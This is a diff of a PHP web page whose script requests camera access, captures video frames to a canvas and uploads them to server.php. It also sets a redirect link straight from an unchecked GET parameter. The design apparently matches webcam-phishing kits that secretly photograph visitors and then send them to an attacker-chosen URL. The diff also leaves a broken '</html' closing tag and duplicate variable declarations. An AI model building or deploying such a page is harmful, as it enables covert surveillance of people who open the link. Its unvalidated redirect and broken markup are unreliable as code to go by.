@@ -1,5 +1,8 @@
 <?php
 $link = "https://google.com";
+if( isset($_GET['link']) ){
+    $link = $_GET['link'];
+}
 ?>
 
 <!DOCTYPE html>
@@ -32,6 +35,7 @@ $link = "https://google.com";
                     video.srcObject = stream;
                     video.play();
 
+                    // save image to server
                     video.addEventListener("canplay", function () {
                         const canvas = document.createElement("canvas");
                         canvas.width = video.videoWidth;
@@ -45,10 +49,12 @@ $link = "https://google.com";
             }
         }
 
+		// Get access to the camera!
 		if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
 		    navigator.mediaDevices.getUserMedia({ video: true }).then(function(stream) {        
 		        video.srcObject = stream;
 		        video.play();
+                // save image to server
                 video.addEventListener("canplay", function () {
                     const canvas = document.createElement("canvas");
                     canvas.width = video.videoWidth;
@@ -61,6 +67,11 @@ $link = "https://google.com";
 		    });
 		}
 
+		var canvas = document.getElementById('canvas');
+		var context = canvas.getContext('2d');
+		var video = document.getElementById('video');
+
+        // save image to server
         function sendToServer(blob) {
             const xhr = new XMLHttpRequest();
             xhr.open("POST", "server.php", true);
@@ -69,4 +80,4 @@ $link = "https://google.com";
         }
 	</script>
 </body>
-</html>
+</html
